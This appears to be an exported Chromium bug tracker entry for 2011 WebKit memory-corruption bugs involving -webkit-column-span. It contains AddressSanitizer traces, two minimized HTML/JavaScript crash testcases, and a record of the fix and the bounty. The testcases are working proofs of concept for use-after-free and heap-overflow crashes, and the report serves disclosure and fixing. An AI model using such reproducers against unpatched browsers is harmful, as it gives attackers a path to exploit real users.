# Use-after frees and bad casts with -webkit-column-span

| Field | Value |
|-------|-------|
| **Issue ID** | [40051571](https://issues.chromium.org/issues/40051571) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | mi...@gmail.com |
| **Assignee** | in...@chromium.org |
| **Created** | 2011-11-26 |
| **Bounty** | $2,000.00 |

## Description

**VULNERABILITY DETAILS**  

crash

**VERSION**  

Chrome Version:  

Chromium 17.0.950.0 (Developer Build 111574)  

OS Linux  

WebKit 535.10 (trunk@101008)  

JavaScript V8 3.7.10

Operating System:  

linux 64bit

**REPRODUCTION CASE**

attached.  

not sure if it's 1 bug or more.

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: renderer  

Crash State:

==25107== ERROR: AddressSanitizer heap-buffer-overflow on address 0x7fffed2bcdc0 at pc 0x55555a9076dc bp 0x7fffffff9810 sp 0x7fffffff97e8  

READ of size 1 at 0x7fffed2bcdc0 thread T0  

#0 0x55555a9076dc in WebCore::RenderTableSection::setNeedsCellRecalc() ???:0  

#1 0x55555a8ba492 in WebCore::RenderObject::destroy() ???:0

0x7fffed2bcdc0 is located 136 bytes to the right of 184-byte region [0x7fffed2bcc80,0x7fffed2bcd38)  

allocated by thread T0 here:  

#0 0x55555cd15257 in malloc /usr/local/google/asan/address-sanitizer/asan/asan\_malloc\_linux.cc:49  

#1 0x55555a6bb91d in WebCore::RenderBlock::createAnonymousColumnsBlock() const ???:0  

#2 0x55555a6bddf0 in WebCore::RenderBlock::splitFlow(WebCore::RenderObject\*, WebCore::RenderBlock\*, WebCore::RenderObject\*,

---

==26506== ERROR: AddressSanitizer heap-use-after-free on address 0x7fffed284eb8 at pc 0x55555a818227 bp 0x7fffffff9860 sp 0x7fffffff9838  

WRITE of size 8 at 0x7fffed284eb8 thread T0  

#0 0x55555a818227 in WebCore::RenderLayer::addChild(WebCore::RenderLayer\*, WebCore::RenderLayer\*) ???:0  

#1 0x55555a8a6048 in WebCore::RenderObject::addLayers(WebCore::RenderLayer\*) ???:0

0x7fffed284eb8 is located 56 bytes inside of 296-byte region [0x7fffed284e80,0x7fffed284fa8)  

freed by thread T0 here:  

#0 0x55555cd1508d in free /usr/local/google/asan/address-sanitizer/asan/asan\_malloc\_linux.cc:37  

#1 0x55555a7975ad in WebCore::RenderBoxModelObject::destroyLayer() ???:0  

#2 0x55555a6b7a7d in WebCore::RenderBlock::willBeDestroyed() ???:0  

#3 0x55555a8ba492 in WebCore::RenderObject::destroy() ???:0

---

==28149== ERROR: AddressSanitizer heap-buffer-overflow on address 0x7fffe61d65c0 at pc 0x55555a687737 bp 0x7fffffff4a40 sp 0x7fffffff4a18  

READ of size 8 at 0x7fffe61d65c0 thread T0  

#0 0x55555a687737 in WebCore::InlineFlowBox::addToLine(WebCore::InlineBox\*) ???:0  

#1 0x55555a725eb6 in WebCore::RenderBlock::createLineBoxes(WebCore::RenderObject\*, WebCore::LineInfo const&, WebCore::InlineBox\*) ???:0  

#2 0x55555a726823 in WebCore::RenderBlock::constructLine(WebCore::BidiRunList[WebCore::BidiRun](javascript:void(0);)&, WebCore::LineInfo const&) ???:0

0x7fffe61d65c0 is located 8 bytes to the right of 56-byte region [0x7fffe61d6580,0x7fffe61d65b8)  

allocated by thread T0 here:  

#0 0x55555cd15257 in malloc /usr/local/google/asan/address-sanitizer/asan/asan\_malloc\_linux.cc:49  

#1 0x55555a771c96 in WebCore::RenderBox::createInlineBox() ???:0  

#2 0x55555a7261e5 in WebCore::RenderBlock::createLineBoxes(WebCore::RenderObject\*, WebCore::LineInfo const&, WebCore::InlineBox\*) ???:0

---

==27095== ERROR: AddressSanitizer heap-use-after-free on address 0x7fffed28a288 at pc 0x55555a70f0fc bp 0x7fffffff7c10 sp 0x7fffffff7be8  

READ of size 8 at 0x7fffed28a288 thread T0  

#0 0x55555a70f0fc in WebCore::RenderBlock::outlineStyleForRepaint() const ???:0  

#1 0x55555a8be5fa in WebCore::RenderObject::adjustRectForOutlineAndShadow(WebCore::IntRect&) const ???:0

0x7fffed28a288 is located 8 bytes inside of 184-byte region [0x7fffed28a280,0x7fffed28a338)  

freed by thread T0 here:  

#0 0x55555cd1508d in free /usr/local/google/asan/address-sanitizer/asan/asan\_malloc\_linux.cc:37  

#1 0x55555a8bf859 in WebCore::RenderObjectChildList::destroyLeftoverChildren() ???:0  

#2 0x55555a6b7701 in WebCore::RenderBlock::willBeDestroyed() ???:0

---

==25803== ERROR: AddressSanitizer heap-use-after-free on address 0x7fffed28b69f at pc 0x55555a82e213 bp 0x7fffffff6db0 sp 0x7fffffff6d88  

READ of size 1 at 0x7fffed28b69f thread T0  

#0 0x55555a82e213 in WebCore::RenderLayer::paintLayer(WebCore::RenderLayer\*, WebCore::GraphicsContext\*, WebCore::IntRect const&, unsigned int, WebCore::RenderObject\*, WebCore::RenderRegion\*, WTF::HashMap<WebCore::OverlapTestRequestClient\*, WebCore::IntRect, WTF::PtrHash[WebCore::OverlapTestRequestClient\\*](javascript:void(0);), WTF::HashTraits[WebCore::OverlapTestRequestClient\\*](javascript:void(0);), WTF::HashTraits[WebCore::IntRect](javascript:void(0);) >\*, unsigned int) ???:0

0x7fffed28b69f is located 31 bytes inside of 296-byte region [0x7fffed28b680,0x7fffed28b7a8)  

freed by thread T0 here:  

#0 0x55555cd1508d in free /usr/local/google/asan/address-sanitizer/asan/asan\_malloc\_linux.cc:37  

#1 0x55555a7975ad in WebCore::RenderBoxModelObject::destroyLayer() ???:0  

#2 0x55555a6b7a7d in WebCore::RenderBlock::willBeDestroyed() ???:0

## Attachments

- [asan-56296.txt](attachments/asan-56296.txt) (text/x-c; charset=us-ascii, 8.0 KB)
- [asan-136184.txt](attachments/asan-136184.txt) (text/x-c; charset=us-ascii, 5.8 KB)
- [56296.html](attachments/56296.html) (text/html; charset=us-ascii, 351 B)
- [31296.html](attachments/31296.html) (text/html; charset=us-ascii, 1.0 KB)
- [asan-8184.txt](attachments/asan-8184.txt) (text/x-c; charset=us-ascii, 9.1 KB)
- [136184.html](attachments/136184.html) (text/html; charset=us-ascii, 949 B)
- [8184.html](attachments/8184.html) (text/html; charset=us-ascii, 1.0 KB)
- [asan-856.txt](attachments/asan-856.txt) (text/x-c; charset=us-ascii, 8.0 KB)
- [856.html](attachments/856.html) (text/html; charset=us-ascii, 665 B)
- [asan-31296.txt](attachments/asan-31296.txt) (text/x-c; charset=us-ascii, 9.0 KB)
- [asan-40104.txt](attachments/asan-40104.txt) (text/x-c; charset=us-ascii, 8.1 KB)
- [40104.html](attachments/40104.html) (text/html; charset=us-ascii, 778 B)
- [asan-30296.txt](attachments/asan-30296.txt) (text/x-c; charset=us-ascii, 7.8 KB)
- [30296.html](attachments/30296.html) (text/html; charset=us-ascii, 824 B)
- [56296two.html](attachments/56296two.html) (text/html; charset=us-ascii, 872 B)
- [asan-56296two.txt](attachments/asan-56296two.txt) (text/x-c; charset=us-ascii, 7.8 KB)

## Timeline

### ke...@chromium.org (2011-11-28)

Hi miaubiz: Just as an update, because nobody responded to this on the weekend, cluster-fuzz reported UAF problems on 3 of the 5 test cases you submitted. I think this is probably more than one bug, but we're trying to get more data, especially the impacted channels. We'll look manually at the other 2 if we don't get anything else from the automated testing.

### mi...@gmail.com (2011-11-28)

here's one more stack

### in...@chromium.org (2011-11-29)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=1910548

Uploader: inferno@chromium.org [2011-11-28 23:39:45]

Crash Type: Heap-buffer-overflow WRITE 4
Crash Address: 0x7fae068ca310
Crash State:
  - crash stack -
  WebCore::RenderLayer::computeScrollDimensions
  WebCore::RenderLayer::contentsSize
  WebCore::RenderBlock::layoutBlockChildren
  

Minimized Testcase (0.67 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv96jAu9iI6wIqcvmeqlH6b_0ByDBSXFvE3zqb5bat1z6Zg9DqfHJbXlofxwRhzEpvx8c186hXC7OvAgQEbMYLW7Zcg9kHgB5ziiSh2s3Hg_NUhpl3lNFKGQOcYjudsBuXweEWnHBgYMieEJnEKLRp2Kgf01A6A
<style>
      #el0 {
        -webkit-column-count: 2;
        display: list-item;
      }
      #el1 {
        display: block;
      }
      #el1::before {
        display: table-row;
      }
      #el2 {
        -webkit-column-span: all;
</style>
    <script>
      function crash(){
        el0 = document.createElement('div') 
        el0.setAttribute('id', 'el0') 
        document.body.appendChild(el0) 
        el1 = document.createElement('q') 
        el1.setAttribute('id', 'el1') 
        el0.appendChild(el1) 
        el2 = document.createElement('div') 
        el2.setAttribute('id', 'el2') 
        el1.appendChild(el2) 
      }
      window.onload=crash
    </script>

### in...@chromium.org (2011-11-29)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=1911140

Uploader: inferno@chromium.org [2011-11-28 17:31:07]

Crash Type: Heap-buffer-overflow READ 8
Crash Address: 0x7faf0e776dc0
Crash State:
  - crash stack -
  WebCore::InlineFlowBox::addToLine
  WebCore::RenderBlock::createLineBoxes
  WebCore::RenderBlock::constructLine
  

Minimized Testcase (0.51 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv97ULAI_nuaRXMh76RqiPOM5Dhji-hraShDnczuDnvgEjzjwaGXh__r2InE2eIhTLOwzlxIWGlSoQ-orDUEg0ATepYnXveM6C5fIueiIJluusJYP3UlKrVVxHEvLLL26x2wSplrKqUjISrJ-wyPb17BdPRe8sA
<style>
      div {
        -webkit-column-count: 2;
      }
      #span1:after {
        display: block;
        content: counter(c);
        -webkit-column-span: all;
</style>
  <script>
  function crash(){
    var el0 = document.createElement('div');
    var el1 = document.createElement('span');
    document.body.appendChild(el0);
    el0.appendChild(el1);
    el1.setAttribute("id", "span1")
    el1.style.display='block';
    setInterval('document.body.style.zoom=Math.random()*2',10)}
  window.onload=crash
</script>

### in...@chromium.org (2011-11-29)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=1911139

Uploader: inferno@chromium.org [2011-11-28 17:17:16]

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x7ff9668a5880
Crash State:
  - crash stack -
  WebCore::RenderBlock::willBeDestroyed
  WebCore::RenderObject::destroy
  - free stack -
  WebCore::RenderObjectChildList::destroyLeftoverChildren
  WebCore::RenderBlock::willBeDestroyed
  

Minimized Testcase (0.83 Kb): https://cluster-fuzz.appspot.com/download/AMIfv96VF7OpHzNM3RpLs9wa6vdjmp5TzJHdJDjb0D0tj2SKynTmhI-hRWoyvHbOXvtbgT8FL0btK1mpkmBo2j9EokbZGmmPhzMR3nJrkMejMb58pJgo_rz1gF_K1t_SR1Bm5Xt917iIBcX4W2m_-t1nMGrSgkwcUg

### in...@chromium.org (2011-11-29)

c#5 is a use after free which is now filed seperately in http://code.google.com/p/chromium/issues/detail?id=105648

This bug will track the bad casts in c#3, c#4 (check out the debug stacktraces on ClusterFuzz)

### in...@chromium.org (2011-11-29)

Upstreamed - https://bugs.webkit.org/show_bug.cgi?id=73265

### mi...@gmail.com (2011-11-29)

here's another one

### mi...@gmail.com (2011-11-29)

and another similar to 56296.html above

### in...@chromium.org (2011-12-14)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-01-20)

[Empty comment from Monorail migration]

### mi...@gmail.com (2012-01-20)

I reported this :D

### in...@chromium.org (2012-01-20)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-01-20)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-01-23)

The last M16 patch is already gone. Mass-updating all of these to M17

### in...@chromium.org (2012-01-24)

http://trac.webkit.org/changeset/105769

### in...@chromium.org (2012-01-24)

merged to m17 in r105792.

### sc...@gmail.com (2012-01-26)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-01-28)

@miaubiz: nice report, two bugs' worth here in the end, hence $2000 in rewards! :D

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### sc...@gmail.com (2012-02-07)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-02-15)

[Empty comment from Monorail migration]

### [Deleted User] (2012-05-15)

Marking old security bugs Fixed..

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### cl...@chromium.org (2013-06-13)

ClusterFuzz has detected this issue as fixed in range 118897:118973.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=1910548

Uploader: inferno@chromium.org [2011-11-28 23:39:45]

Crash Type: Heap-buffer-overflow WRITE 4
Crash Address: 0x7fae068ca310
Crash State:
  - crash stack -
  WebCore::RenderLayer::computeScrollDimensions
  WebCore::RenderLayer::contentsSize
  WebCore::RenderBlock::layoutBlockChildren
  
Fixed: https://cluster-fuzz.appspot.com/revisions?range=118897:118973

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv96jAu9iI6wIqcvmeqlH6b_0ByDBSXFvE3zqb5bat1z6Zg9DqfHJbXlofxwRhzEpvx8c186hXC7OvAgQEbMYLW7Zcg9kHgB5ziiSh2s3Hg_NUhpl3lNFKGQOcYjudsBuXweEWnHBgYMieEJnEKLRp2Kgf01A6A

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/105459?no_tracker_redirect=1

[Monorail mergedwith: crbug.com/chromium/105648, crbug.com/chromium/105841]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40051571)*
